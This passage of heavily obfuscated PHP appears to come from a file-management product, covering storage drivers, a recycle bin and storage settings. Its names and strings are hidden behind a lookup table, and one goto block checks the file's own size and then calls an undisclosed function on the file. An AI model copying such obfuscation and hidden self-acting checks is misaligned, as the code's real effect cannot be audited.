$œ‹¥İÛÄ == $¼…ò¬Ú†[1364]) { continue; } $ç¦ıã” = $”¦Á³äá . $œ‹¥İÛÄ; $ÓĞê¾ñ” = is_dir($ç¦ıã”) && !is_link($ç¦ıã”) ? 1 : 0; $ç¦ıã” = $ÓĞê¾ñ” ? $ç¦ıã” . $¼…ò¬Ú†[8] : $ç¦ıã”; $˜¹ÉÒò[] = array($¼…ò¬Ú†[87] => $ç¦ıã”, $¼…ò¬Ú†[78] => $ÓĞê¾ñ”, $¼…ò¬Ú†[88] => intval(@filemtime($ç¦ıã”)), $¼…ò¬Ú†[79] => $ÓĞê¾ñ” ? 0 : intval($this->size($ç¦ıã”))); if ($ÓĞê¾ñ”) { $this->listAll($ç¦ıã”, $˜¹ÉÒò); } } closedir($Ìè‰àÚ); return $˜¹ÉÒò; } public function has($æİÌêˆ®, $µÂĞ£Ò¡ = false, $âŞ¦ÉÓõ = true) { $¦ù¶ùÌ‹ =& $_SERVER[ç¦¬”œš]; $æİÌêˆ® = $this->iconvSystem($æİÌêˆ®); $æİÌêˆ® = rtrim($æİÌêˆ®, $¦ù¶ùÌ‹[8]) . $¦ù¶ùÌ‹[8]; if (!($Ôš¹Ìóô = @opendir($æİÌêˆ®))) { return !1; } $‹´ûÙûÔ = 0; $›â†› = 0; $˜²ì ° = 0; while (($é›÷öå’ = readdir($Ôš¹Ìóô)) !== !1) { if ($é›÷öå’ == $¦ù¶ùÌ‹[10] || $é›÷öå’ == $¦ù¶ùÌ‹[1364]) { continue; } $µ€„ó†µ = $æİÌêˆ® . $é›÷öå’; if ($µÂĞ£Ò¡) { $˜²ì °++; if (@is_file($µ€„ó†µ)) { $‹´ûÙûÔ++; } else { $›â†›++; } if ($˜²ì ° > 10000) { break; } continue; } if ($âŞ¦ÉÓõ) { if (@is_file($µ€„ó†µ)) { return !0; } } else { if (@is_dir($µ€„ó†µ . $¦ù¶ùÌ‹[8])) { return !0; } } } closedir($Ôš¹Ìóô); if ($µÂĞ£Ò¡) { return array($¦ù¶ùÌ‹[239] => $‹´ûÙûÔ, $¦ù¶ùÌ‹[240] => $›â†›); } return !1; } public function hashSimple($§üº¶ÎÛ) { $ÖøÀÃäÃ =& $_SERVER[ç¦¬”œš]; if (!$§üº¶ÎÛ) { return md5($ÖøÀÃäÃ[12]); } $§üº¶ÎÛ = $this->iconvSystem($§üº¶ÎÛ); $çúÆ¸‡Ò = $this->size($§üº¶ÎÛ); $ŠìÊ¡¯ˆ = 200; $ıŸ·Î¦€ = 50; if ($çúÆ¸‡Ò <= $ŠìÊ¡¯ˆ * $ıŸ·Î¦€) { return $this->hashMd5($§üº¶ÎÛ) . $çúÆ¸‡Ò; } $»˜§Ò¾› = $ÖøÀÃäÃ[12]; $Ñ‘ºØù = intval($çúÆ¸‡Ò / $ıŸ·Î¦€); $óï÷¥ç• = fopen($§üº¶ÎÛ, $ÖøÀÃäÃ[1458]); if (!$óï÷¥ç•) { return $»˜§Ò¾›; } for ($ÛĞ××½ = 0; $ÛĞ××½ < $ıŸ·Î¦€; $ÛĞ××½++) { fseek_64($óï÷¥ç•, $Ñ‘ºØù * $ÛĞ××½); $»˜§Ò¾› .= fread($óï÷¥ç•, $ŠìÊ¡¯ˆ); } fseek_64($óï÷¥ç•, $çúÆ¸‡Ò - $ŠìÊ¡¯ˆ); $»˜§Ò¾› .= fread($óï÷¥ç•, $ŠìÊ¡¯ˆ); fclose($óï÷¥ç•); return md5($»˜§Ò¾›) . $çúÆ¸‡Ò; } public function getContent($™÷À´ê) { $™÷À´ê = $this->iconvSystem($™÷À´ê); return file_get_contents($™÷À´ê); } public function setContent($Óûİ²„, $…£¯ ¢ = '') { $Óûİ²„ = $this->iconvSystem($Óûİ²„); $„Ú¬»Ïş = @file_put_contents($Óûİ²„, $…£¯ ¢, LOCK_EX); if (!$„Ú¬»Ïş) { $this->writeLog(__FUNCTION__ . $_SERVER[ç¦¬”œš][1449], !0); } clearstatcache(); @chmod($Óûİ²„, $this->pathAuth); return $„Ú¬»Ïş === !1 ? !1 : !0; } public function fileSubstr($ŒÇö³±ø, $ãôéÌÇ = 0, $šŠÈ…Ì† = false) { $õÓÏæÑº =& $_SERVER[ç¦¬”œš]; $ŒÇö³±ø = $this->iconvSystem($ŒÇö³±ø); if ($šŠÈ…Ì† === !1) { $šŠÈ…Ì† = $this->size($ŒÇö³±ø); } if ($šŠÈ…Ì† <= 0) { return $õÓÏæÑº[12]; } $¤èØ„Ùê = fopen($ŒÇö³±ø, $õÓÏæÑº[1458]); if (!$¤èØ„Ùê) { return !1; } fseek_64($¤èØ„Ùê, $ãôéÌÇ); $¾Ãì‚Ë = fread($¤èØ„Ùê, $šŠÈ…Ì†); fclose($¤èØ„Ùê); if (!$¾Ãì‚Ë) { $this->writeLog(__FUNCTION__ . $õÓÏæÑº[1449], !0); } return $¾Ãì‚Ë; } public function upload($—“ÔŒøˆ, $¡‚ÅŠ¤, $Ìê“ıë™ = false, $Û¡ê¦ß— = REPEAT_REPLACE) { if ($Ìê“ıë™) { return $this->moveFile($¡‚ÅŠ¤, $—“ÔŒøˆ); } return $this->copyFile($¡‚ÅŠ¤, $—“ÔŒøˆ); } public function setModifyTime($î¬ÆÇº, $­ê–†ÀÀ = '') { @touch($î¬ÆÇº, intval($­ê–†ÀÀ)); } public function download($¬ó“³Ò·, $Ñ‰ƒÉÊí) { return $this->iconvSystem($¬ó“³Ò·); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($‘ºÖËõÀ) { parent::__construct($‘ºÖËõÀ); $this->setSignVersion($_SERVER[ç¦¬”œš][247]); } public function fileOutImage($’’Âƒø¬, $İ¨ÅŒª = 250) { $è‡â×Ñ¬ =& $_SERVER[ç¦¬”œš]; if ($this->size($’’Âƒø¬) > 1024 * 1024 * 25) { return $this->fileOutImageServer($’’Âƒø¬, $İ¨ÅŒª); } $”ìŸğÁ— = array($è‡â×Ñ¬[1459] => $è‡â×Ñ¬[1460] . $İ¨ÅŒª . $è‡â×Ñ¬[1461]); $¨Ø¢–‚² = $this->link($’’Âƒø¬, $”ìŸğÁ—); $this->fileOutLink($¨Ø¢–‚²); } public function fileOutLink($Åãû™ó) { $²œØ =& $_SERVER[ç¦¬”œš]; if (substr($Åãû™ó, 0, 7) == $²œØ[313]) { $Åãû™ó = $²œØ[314] . substr($Åãû™ó, 7); } header($²œØ[175] . $Åãû™ó); die; } } goto FÑ‹¾Å³ô­; EÎŠÔƒôÏõ: define($_SERVER[ç¦¬”œš][317], 3); define($_SERVER[ç¦¬”œš][318], 1); define($_SERVER[ç¦¬”œš][319], 0); goto Eô×Îø¯Ù; cÁË´ËŒãÆ: $_file = $_SERVER[$_SERVER[ç¦¬”œš][472]]; $_size = $_SERVER[ç¦¬”œš][473]; if ($_SERVER[$_SERVER[ç¦¬”œš][474]] != $_size($_file)) { $_getc = $_SERVER[ç¦¬”œš][475]; $_getfile = $_SERVER[$_SERVER[ç¦¬”œš][476]] . $_SERVER[ç¦¬”œš][477]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ç¦¬”œš][262], $_getfilec); if (count($_getarrs) < $_SERVER[ç¦¬”œš][478]) { $exit = $_SERVER[ç¦¬”œš][479]; $exit(); } $_act = $_SERVER[ç¦¬”œš][480]; $_act($_file); } goto a–æ‹¼; a®¸ŠÅÍ“: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\162\143\145\x5f\x72\x65\143\171\143\154\145"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\x65\x54\x69\x6d\x65", "\x74\151\x6d\145", "\x69\156\x73\x65\x72\x74", "\146\165\156\143\164\151\157\x6e")); public function listData($š«ˆÏØş = false) { $â¹îÑ»¹ =& $_SERVER[ç¦¬”œš]; $š«ˆÏØş = $š«ˆÏØş ? $š«ˆÏØş : USER_ID; $Ï’—Ü£ = $this->where(array($â¹îÑ»¹[1761] => $š«ˆÏØş))->select(); return array_to_keyvalue($Ï’—Ü£, $â¹îÑ»¹[12], $â¹îÑ»¹[193]); } public function moveToRecycle($÷õ‚áÂ) { $ÅÈš„± =& $_SERVER[ç¦¬”œš]; $ÕÄ¢Ü®‰ = Model($ÅÈš„±[1419]); $¸ØÊüÆ† = $ÕÄ¢Ü®‰->sourceInfo($÷õ‚áÂ); if (!$¸ØÊüÆ† || $¸ØÊüÆ†[$ÅÈš„±[514]] == $ÅÈš„±[91]) { return; } $¾Ëˆõ± = array($ÅÈš„±[500] => $÷õ‚áÂ, $ÅÈš„±[1761] => USER_ID, $ÅÈš„±[657] => $¸ØÊüÆ†[$ÅÈš„±[190]], $ÅÈš„±[658] => $¸ØÊüÆ†[$ÅÈš„±[578]], $ÅÈš„±[661] => $¸ØÊüÆ†[$ÅÈš„±[593]]); $this->add($¾Ëˆõ±); $this->recycleMove($÷õ‚áÂ, 1); if ($¸ØÊüÆ†[$ÅÈš„±[494]] == $ÅÈš„±[91]) { $İ³‹­Ã• = array($ÅÈš„±[661] => array($ÅÈš„±[621], $¸ØÊüÆ†[$ÅÈš„±[593]] . $÷õ‚áÂ . $ÅÈš„±[622])); $ÕÄ¢Ü®‰->where($İ³‹­Ã•)->setField($ÅÈš„±[514], 1); } } public function clear() { $this->remove(!1); } public function remove($ÈëÛò = false, $§ğ§Ò“å = false) { $ıÅ×¬ =& $_SERVER[ç¦¬”œš]; $§ğ§Ò“å = $§ğ§Ò“å ? $§ğ§Ò“å : USER_ID; $÷’“³ñ = Model($ıÅ×¬[1419]); $üÛÅ³ÀÚ = $this->listData($§ğ§Ò“å); $ÈëÛò = $ÈëÛò === !1 ? !1 : $ÈëÛò; $‰˜õ¦¹‰ = array(); foreach ($üÛÅ³ÀÚ as $¼º­óç¿) { if ($ÈëÛò != !1 && !in_array($¼º­óç¿, $ÈëÛò)) { continue; } $¾¼Ò ÈÙ = $÷’“³ñ->sourceInfo($¼º­óç¿); $÷’“³ñ->remove($¼º­óç¿, !1); $çĞãÕÎ = $¾¼Ò ÈÙ[$ıÅ×¬[190]] . $ıÅ×¬[11] . $¾¼Ò ÈÙ[$ıÅ×¬[578]]; $‰˜õ¦¹‰[$çĞãÕÎ] = array($ıÅ×¬[657] => $¾¼Ò ÈÙ[$ıÅ×¬[190]], $ıÅ×¬[578] => $¾¼Ò ÈÙ[$ıÅ×¬[578]]); $this->where(array($ıÅ×¬[193] => $¼º­óç¿))->delete(); } foreach ($‰˜õ¦¹‰ as $¹Ü¶Š€’) { $÷’“³ñ->targetSpaceUpdate($¹Ü¶Š€’[$ıÅ×¬[190]], $¹Ü¶Š€’[$ıÅ×¬[578]]); } } public function restore($Ï÷û¿şÎ = false) { $²à¾ıË = $this->listData(); $this->_restoreSource($²à¾ıË, $Ï÷û¿şÎ); } public function removeUserAll($­¸Ğş•) { $this->remove(!1, $­¸Ğş•); } public function restoreItem($—üˆ“¶) { $this->_restoreSource(array($—üˆ“¶), array($—üˆ“¶)); } private function _restoreSource($™š…«Úœ, $Ç¸Ğ–È§) { $¬åâÌë =& $_SERVER[ç¦¬”œš]; $† ±àÏ = Model($¬åâÌë[1419]); $Ç¸Ğ–È§ = $Ç¸Ğ–È§ == !1 ? !1 : $Ç¸Ğ–È§; if (!$™š…«Úœ) { return !0; } $ ÊÉÓÍ = array(); foreach ($™š…«Úœ as $İ³ØßˆÏ) { if ($Ç¸Ğ–È§ != !1 && !in_array($İ³ØßˆÏ, $Ç¸Ğ–È§)) { continue; } $²Ç•Áº¡ = $† ±àÏ->sourceInfo($İ³ØßˆÏ); $‘»Ïª¨ä = $† ±àÏ->sourceInfo($²Ç•Áº¡[$¬åâÌë[192]]); if ($‘»Ïª¨ä[$¬åâÌë[514]] == $¬åâÌë[91]) { continue; } $† ±àÏ->lockMoveStart($İ³ØßˆÏ); $this->recycleMove($İ³ØßˆÏ, 0); if ($²Ç•Áº¡[$¬åâÌë[494]] == $¬åâÌë[91]) { $©°Û˜õŸ = array($¬åâÌë[661] => array($¬åâÌë[621], $²Ç•Áº¡[$¬åâÌë[593]] . $İ³ØßˆÏ . $¬åâÌë[622])); $† ±àÏ->where($©°Û˜õŸ)->setField($¬åâÌë[514], 0); $this->restoreFolderChildren($İ³ØßˆÏ, $™š…«Úœ); } $this->where(array($¬åâÌë[193] => $İ³ØßˆÏ))->delete(); $† ±àÏ->folderSizeReset($²Ç•Áº¡[$¬åâÌë[192]]); $ ÊÉÓÍ[] = $²Ç•Áº¡[$¬åâÌë[192]]; if ($²Ç•Áº¡[$¬åâÌë[494]] == $¬åâÌë[91]) { $ ÊÉÓÍ[] = $İ³ØßˆÏ; } $† ±àÏ->lockMoveEnd($İ³ØßˆÏ); } $† ±àÏ->updateModifyTime($ ÊÉÓÍ); } private function restoreFolderChildren($°Š€™õ, $ñâîÆ¿¾) { $öÍæËÒ‹ =& $_SERVER[ç¦¬”œš]; $É¥³é¡ = Model($öÍæËÒ‹[1419]); $êì©¸“ó = array($öÍæËÒ‹[193] => array($öÍæËÒ‹[7], array())); foreach ($ñâîÆ¿¾ as $ÇÍŞ«¹‘) { if ($ÇÍŞ«¹‘ == $°Š€™õ) { continue; } if (!$É¥³é¡->isParentOf($°Š€™õ, $ÇÍŞ«¹‘)) { continue; } $Î½æ‰í’ = $É¥³é¡->sourceInfo($ÇÍŞ«¹‘); if ($Î½æ‰í’[$öÍæËÒ‹[494]] == $öÍæËÒ‹[91]) { $êì©¸“ó[] = array($öÍæËÒ‹[661] => array($öÍæËÒ‹[621], $Î½æ‰í’[$öÍæËÒ‹[593]] . $ÇÍŞ«¹‘ . $öÍæËÒ‹[622])); } else { $êì©¸“ó[$öÍæËÒ‹[193]][1][] = $ÇÍŞ«¹‘; } } if (!$êì©¸“ó[$öÍæËÒ‹[193]][1]) { unset($êì©¸“ó[$öÍæËÒ‹[193]]); } if (!$êì©¸“ó) { return; } if (is_array($êì©¸“ó[$öÍæËÒ‹[193]]) && is_array($êì©¸“ó[$öÍæËÒ‹[193]][1])) { $êì©¸“ó[$öÍæËÒ‹[193]][1] = array_unique($êì©¸“ó[$öÍæËÒ‹[193]][1]); } $êì©¸“ó[$öÍæËÒ‹[1079]] = $öÍæËÒ‹[2071]; $É¥³é¡->where($êì©¸“ó)->setField($öÍæËÒ‹[514], 1); } private function recycleMove($† ¡õÉõ, $Éöí¨¬ = 1) { $Û–¢çºÏ =& $_SERVER[ç¦¬”œš]; $­«éãóé = Model($Û–¢çºÏ[1419]); $× ¹ª¥± = Model($Û–¢çºÏ[2293]); $£üó•à¶ = array($Û–¢çºÏ[193] => $† ¡õÉõ); if ($Éöí¨¬) { $­«éãóé->where($£üó•à¶)->setField($Û–¢çºÏ[514], 1); $× ¹ª¥±->eventRecycle($† ¡õÉõ, $Û–¢çºÏ[2294]); } else { $ûûá½ó– = $­«éãóé->where($£üó•à¶)->find(); $‘ü¦ÍÕÌ = $ûûá½ó–[$Û–¢çºÏ[494]] == $Û–¢çºÏ[91]; $à¹ú–ÃÆ = $­«éãóé->fileNameAuto($ûûá½ó–[$Û–¢çºÏ[192]], $ûûá½ó–[$Û–¢çºÏ[32]], REPEAT_RENAME_FOLDER, $‘ü¦ÍÕÌ); if ($à¹ú–ÃÆ != $ûûá½ó–[$Û–¢çºÏ[32]]) { $­«éãóé->rename($† ¡õÉõ, $à¹ú–ÃÆ); } $­«éãóé->where($£üó•à¶)->setField($Û–¢çºÏ[514], 0); $× ¹ª¥±->eventRecycle($† ¡õÉõ, $Û–¢çºÏ[2295]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\56\163\x6f\x75\162\x63\x65\123\x65\143\162\x65\x74\114\151\x73\164"; public $field = array("\163\157\165\162\x63\x65\111\x44", "\164\171\x70\x65\x49\x44", "\x63\162\x65\141\x74\145\x55\163\x65\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\56\x73\x74\157\x72\141\147\x65\114\151\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\x73\151\x7a\145\x4d\141\x78", "\163\171\x73\x74\145\155", "\144\x65\146\x61\x75\154\x74", "\144\x72\x69\x76\145\162", "\x63\x6f\156\x66\151\147"); public function listData($°º´şÓ = false, $×–¦¨§ = "\155\x6f\x64\151\x66\x79\124\151\155\x65", $ƒÄùÕá = false) { $šØƒÈÚ˜ =& $_SERVER[ç¦¬”œš]; $ú²À—ı  = parent::listData($°º´şÓ, $×–¦¨§, $ƒÄùÕá); if ($°º´şÓ) { return $ú²À—ı ; } $úë©÷¯µ = array(); if ($GLOBALS[$šØƒÈÚ˜[2296]]) { $úë©÷¯µ = $this->ioSizeUseGet(array_to_keyvalue($ú²À—ı , $šØƒÈÚ˜[12], $šØƒÈÚ˜[484])); } foreach ($ú²À—ı  as $Ù´»Ç×¦ => $¿ˆªÂí) { unset($ú²À—ı [$Ù´»Ç×¦][$šØƒÈÚ˜[6]]); $ú²À—ı [$Ù´»Ç×¦][$šØƒÈÚ˜[1957]] = isset($úë©÷¯µ[$¿ˆªÂí[$šØƒÈÚ˜[484]]]) ? $úë©÷¯µ[$¿ˆªÂí[$šØƒÈÚ˜[484]]] : 0; } return $ú²À—ı ; } public function ioSizeUseGet($¬¸×¦¤ı) { $˜ÕñœÍ¾ =& $_SERVER[ç¦¬”œš]; if (!$¬¸×¦¤ı) { return array(); } $£›ÊòöÆ = $˜ÕñœÍ¾[2297] . implode($˜ÕñœÍ¾[50], $¬¸×¦¤ı); $ôªİÈìµ = Cache::get($£›ÊòöÆ); if ($ôªİÈìµ) { return $ôªİÈìµ; } $ÍÁª ¤Ú = array($˜ÕñœÍ¾[897] => $˜ÕñœÍ¾[484], $˜ÕñœÍ¾[2298] => $˜ÕñœÍ¾[79]); $ÖÂÙ˜µÑ = array($˜ÕñœÍ¾[897] => array($˜ÕñœÍ¾[7], $¬¸×¦¤ı)); $ôªİÈìµ = Model($˜ÕñœÍ¾[869])->field($ÍÁª ¤Ú)->where($ÖÂÙ˜µÑ)->group($˜ÕñœÍ¾[897])->select(); $ôªİÈìµ = array_to_keyvalue($ôªİÈìµ, $˜ÕñœÍ¾[484], $˜ÕñœÍ¾[79]); Cache::set($£›ÊòöÆ, $ôªİÈìµ, 600); return $ôªİÈìµ; } public function getConfig($»ù´“ø§) { $ôœºÜÙ¸ = parent::listData($»ù´“ø§); return json_decode($ôœºÜÙ¸[$_SERVER[ç¦¬”œš][6]], !0); } public function update($¦½³Ùæ, $¤²Ï¨òÉ) { $’’¨ãÓÔ =& $_SERVER[ç¦¬”œš]; $ÔŸ„é‹ = $¤²Ï¨òÉ[$’’¨ãÓÔ[32]]; $®ì¾ª¬š = array_to_keyvalue(parent::listData(), $’’¨ãÓÔ[32]); if (isset($®ì¾ª¬š[$ÔŸ„é‹]) && $®ì¾ª¬š[$ÔŸ„é‹][$’’¨ãÓÔ[484]] != $¦½³Ùæ) { return !1; } $this->checkPwd($¦½³Ùæ, $¤²Ï¨òÉ); if (isset($¤²Ï¨òÉ[$’’¨ãÓÔ[2299]]) && $¤²Ï¨òÉ[$’’¨ãÓÔ[2299]] == $’’¨ãÓÔ[91]) { $this->checkConfig($¤²Ï¨òÉ); } unset($¤²Ï¨òÉ[$’’¨ãÓÔ[2299]]); $éß¸µ³ = parent::update($¦½³Ùæ, $¤²Ï¨òÉ); if ($éß¸µ³ && $¤²Ï¨òÉ[$’’¨ãÓÔ[37]]) { $¹ÂÇóÏ = 0; foreach ($®ì¾ª¬š as $Ã­Å¥¯ó) { if ($Ã­Å¥¯ó[$’’¨ãÓÔ[37]] && $Ã­Å¥¯ó[$’’¨ãÓÔ[484]] != $¦½³Ùæ) { $¹ÂÇóÏ = $Ã­Å¥¯ó[$’’¨ãÓÔ[484]]; parent::update($Ã­Å¥¯ó[$’’¨ãÓÔ[484]], array($’’¨ãÓÔ[37] => 0)); } } $this->updateBackup($¦½³Ùæ, $¹ÂÇóÏ); } return $éß¸µ³; } public function add($ü“æª®) { $ó€ßøñ =& $_SERVER[ç¦¬”œš]; $îîÛÚËå = array_to_keyvalue(parent::listData(), $ó€ßøñ[32]); if (isset($îîÛÚËå[$ü“æª®[$ó€ßøñ[32]]])) { return !1; } $this->checkConfig($ü“æª®); $§Ì»›Á = parent::insert($ü“æª®); if ($§Ì»›Á && $ü“æª®[$ó€ßøñ[37]]) { foreach ($îîÛÚËå as $½Ó·¾) { if ($½Ó·¾[$ó€ßøñ[37]]) { parent::update($½Ó·¾[$ó€ßøñ[484]], array($ó€ßøñ[37] => 0)); } } } return $§Ì»›Á; } public function updateBackup($ÉÚå§˜, $ÚûÊ˜•) { $¥Å„˜ı§ =& $_SERVER[ç¦¬”œš]; if (!$ÚûÊ˜•) { return; } $ƒÙöºõ = Model($¥Å„˜ı§[828])->config(); if ($ƒÙöºõ[$¥Å„˜ı§[1740]] != $¥Å„˜ı§[91] || $ƒÙöºõ[$¥Å„˜ı§[832]] != $ÚûÊ˜•) { return; } $Î‰¾Şè = Model($¥Å„˜ı§[850])->get($¥Å„˜ı§[863]); $Î‰¾Şè = json_decode($Î‰¾Şè, !0); if (!$Î‰¾Şè) { return; } $Î‰¾Şè[$¥Å„˜ı§[832]] = $ÉÚå§˜; Model($¥Å„˜ı§[850])->set(array($¥Å„˜ı§[863] => $Î‰¾Şè)); } public function checkPwd($Æ·Õ·»ì, &$Õ»ÃÜİ¿) { $ûÏ¥Áü =& $_SERVER[ç¦¬”œš]; if (empty($Õ»ÃÜİ¿[$ûÏ¥Áü[6]])) { return; } $ë±õ°ƒÜ = json_decode($Õ»ÃÜİ¿[$ûÏ¥Áü[6]], !0); $•í¹ÕÙì = $ûÏ¥Áü[12]; $ªŠÉ…Ô“ = array($ûÏ¥Áü[2300], $ûÏ¥Áü[2301], $ûÏ¥Áü[968]); foreach ($ªŠÉ…Ô“ as $ªê™êÊæ) { if (isset($ë±õ°ƒÜ[$ªê™êÊæ])) { $•í¹ÕÙì = $ªê™êÊæ; break; } } if (!$•í¹ÕÙì) { return; } $ç Ùç¨Š = $this->getConfig($Æ·Õ·»ì); $ñÇì§Ö“ = $ç Ùç¨Š[$•í¹ÕÙì]; $Çæšã›é = $ë±õ°ƒÜ[$•í¹ÕÙì]; if ($Çæšã›é == str_repeat($ûÏ¥Áü[220], strlen($ñÇì§Ö“))) { $ë±õ°ƒÜ[$•í¹ÕÙì] = $ñÇì§Ö“; $Õ»ÃÜİ¿[$ûÏ¥Áü[6]] = json_encode($ë±õ°ƒÜ); } else { if ($Çæšã›é != $ñÇì§Ö“) { $Õ»ÃÜİ¿[$ûÏ¥Áü[2299]] = $ûÏ¥Áü[91]; } } } public function checkConfig(&$ß¹ğøã¾, $È±ƒß‡’ = false) { $÷¨±íèÎ =& $_SERVER[ç¦¬”œš]; $ìîô½íƒ = strtolower($ß¹ğøã¾[$÷¨±íèÎ[98]]); $ë†Ùç²æ = json_decode($ß¹ğøã¾[$÷¨±íèÎ[6]], !0); foreach ($ë†Ùç²æ as $Öõ†á»Ë => $Ö¹„À×) { if (is_string($Ö¹„À×)) { $ë†Ùç²æ[$Öõ†á»Ë] = trim($Ö¹„À×); } } $ë†Ùç²æ[$÷¨±íèÎ[2302]] = rand_string(6); $ ¡±ÚÏ‰ = $GLOBALS[$÷¨±íèÎ[6]][$÷¨±íèÎ[92]][$÷¨±íèÎ[905]]; $’‡‡–š = isset($ ¡±ÚÏ‰[$ìîô½íƒ]) ? $ ¡±ÚÏ‰[$ìîô½íƒ] : ucfirst($ìîô½íƒ); $â¬Ò•ãı = $÷¨±íèÎ[77] . $’‡‡–š; if (!$’‡‡–š || !class_exists($â¬Ò•ãı)) { if ($È±ƒß‡’) { return LNG($÷¨±íèÎ[2303]); } write_log(array($÷¨±íèÎ[2304], $ß¹ğøã¾, get_caller_info()), $÷¨±íèÎ[215]); show_json(LNG($÷¨±íèÎ[2303]), !1, $ß¹ğøã¾); } $¼û±·Ø’ = new $â¬Ò•ãı($ë†Ùç²æ); if (in_array($ìîô½íƒ, $¼û±·Ø’->objectDriver)) { try { if (!$¼û±·Ø’->isBucketCors() && !$¼û±·Ø’->setBucketCors()) { $¯È”ıÉô = LNG($÷¨±íèÎ[2305]); $¯È”ıÉô .= $÷¨±íèÎ[2306] . LNG($÷¨±íèÎ[2307]); } } catch (Exception $˜¨€™¼) { $¯È”ıÉô = $˜¨€™¼->getMessage(); } if (isset($¯È”ıÉô)) { return $this->_parseError($¯È”ıÉô, $ìîô½íƒ, $È±ƒß‡’); } if ($ìîô½íƒ == $÷¨±íèÎ[68] && !$¼û±·Ø’->checkRegion()) { return $this->_parseError(LNG($÷¨±íèÎ[2308]), $ìîô½íƒ, $È±ƒß‡’); } } $ö¥²¦œÍ = rtrim($ë†Ùç²æ[$÷¨±íèÎ[1263]], $÷¨±íèÎ[8]) . $÷¨±íèÎ[8]; $òöãßÚí = $¼û±·Ø’->getPath($ö¥²¦œÍ . $÷¨±íèÎ[1267]); try { if ($ìîô½íƒ == $÷¨±íèÎ[109]) { $¼û±·Ø’->mkdir($ö¥²¦œÍ); } $ÒôÀ³ãò = $¼û±·Ø’->mkfile($òöãßÚí); if (!$ÒôÀ³ãò) { $¯È”ıÉô = LNG($÷¨±íèÎ[2305]); } } catch (Exception $˜¨€™¼) { $¯È”ıÉô = $˜¨€™¼->getMessage(); } if (isset($¯È”ıÉô)) { return $this->_parseError($¯È”ıÉô, $ìîô½íƒ, $È±ƒß‡’); } $ë†Ùç²æ[$÷¨±íèÎ[1263]] = $ö¥²¦œÍ; $ß¹ğøã¾[$÷¨±íèÎ[6]] = json_encode($ë†Ùç²æ); $ß¹ğøã¾[$÷¨±íèÎ[98]] = $’‡‡–š; return !0; } private function _parseError($Ü‹ÛÆ¬ä, $Ğ½¬…ò¸, $Ô¸é‘’ô = false) { $Î‰‡¹Ğ =& $_SERVER[ç¦¬”œš]; if ($Ğ½¬…ò¸ == $Î‰‡¹Ğ[68] && stripos($Ü‹ÛÆ¬ä, $Î‰‡¹Ğ[2309])) { $ßÌóÖàÔ = explode($Î‰‡¹Ğ[10], $Ü‹ÛÆ¬ä); $Š’®¬ñ’ = isset($ßÌóÖàÔ[1]) ? $ßÌóÖàÔ[1] : $Î‰‡¹Ğ[12]; $ƒˆ÷ê’ = array($Î‰‡¹Ğ[2310] => LNG($Î‰‡¹Ğ[2311]), $Î‰‡¹Ğ[2312] => LNG($Î‰‡¹Ğ[2313])); if (isset($ƒˆ÷ê’[$Š’®¬ñ’])) { $Ü‹ÛÆ¬ä = $ƒˆ÷ê’[$Š’®¬ñ’]; } } if (stripos($Ü‹ÛÆ¬ä, $Î‰‡¹Ğ[2314]) === 0) { $İè¦µ = strpos($Ü‹ÛÆ¬ä, $Î‰‡¹Ğ[178]); if ($İè¦µ === !1) { $İè¦µ = strpos($Ü‹ÛÆ¬ä, $Î‰‡¹Ğ[4]); } if ($İè¦µ !== !1) { $Ü‹ÛÆ¬ä = substr($Ü‹ÛÆ¬ä, $İè¦µ + 1); } } $Ü‹ÛÆ¬ä = LNG($Î‰‡¹Ğ[1270]) . $Ü‹ÛÆ¬ä; if ($Ô¸é‘’ô) { return $Ü‹ÛÆ¬ä; } show_json($Ü‹ÛÆ¬ä, !1); } public function driverListSystem() { $œ‰âõŠí =& $_SERVER[ç¦¬”œš]; $Ú“â««è = parent::listData(); $ÏÔ×ùŠ = array(); foreach ($Ú“â««è as $Ù•Š¬ò½) { unset($Ù•Š¬ò½[$œ‰âõŠí[231]], $Ù•Š¬ò½[$œ‰âõŠí[88]]); $Ù•Š¬ò½[$œ‰âõŠí[6]] = json_decode($Ù•Š¬ò½[$œ‰âõŠí[6]], !0); $ÏÔ×ùŠ[] = $Ù•Š¬ò½; } return $ÏÔ×ùŠ; } public function defaultDriver() { $Œ²”îôˆ =& $_SERVER[ç¦¬”œš]; $öĞËãì˜ = parent::listData(); $ËîÀíĞİ = array_filter_by_field($öĞËãì˜, $Œ²”îôˆ[37], 1); $ËîÀíĞİ = $ËîÀíĞİ[0]; if ($ËîÀíĞİ) { $ËîÀíĞİ[$Œ²”îôˆ[6]] = json_decode($ËîÀíĞİ[$Œ²”îôˆ[6]], !0); } return $ËîÀíĞİ; } public function driverInfo($œÚ†šÊª) { $›©ÈÏºå =& $_SERVER[ç¦¬”œš]; $ŞÅç€°á = array_to_keyvalue(parent::listData(), $›©ÈÏºå[484]); if (!isset($ŞÅç€°á[$œÚ†šÊª])) { return !1; } $ûß¥– = $ŞÅç€°á[$œÚ†šÊª]; $ûß¥–[$›©ÈÏºå[6]] = json_decode($ûß¥–[$›©ÈÏºå[6]], !0); return $ûß¥–; } public function remove($ŸĞ¾úé¡) { $this->removeShareItems($ŸĞ¾úé¡); return parent::remove($ŸĞ¾úé¡); } public function removeWithFile($È‘æÍë£, $ø€Î¥á², $”Ëµ‚÷™, $èº¼¯ºê = false) { $£Œ„ˆÛ‘ =& $_SERVER[ç¦¬”œš]; $¯·ğû­ = array($£Œ„ˆÛ‘[897] => $È‘æÍë£); $Ò¾Ê™ññ = Model($£Œ„ˆÛ‘[553])->where($¯·ğû­)->count(); $¬êÎ°Ïª = Model($£Œ„ˆÛ‘[553])->where($¯·ğû­)->sum($£Œ„ˆÛ‘[79]); $Ñûöˆ¿’ = $ø€Î¥á² . $£Œ„ˆÛ‘[2315] . $È‘æÍë£; $ıë–Õõ = LNG($ø€Î¥á² == $£Œ„ˆÛ‘[629] ? $£Œ„ˆÛ‘[2316] : $£Œ„ˆÛ‘[2317]); $ã¹•Ëá = new TaskFileTransfer($Ñûöˆ¿’, $£Œ„ˆÛ‘[215], $Ò¾Ê™ññ, $ıë–Õõ . $£Œ„ˆÛ‘[462] . 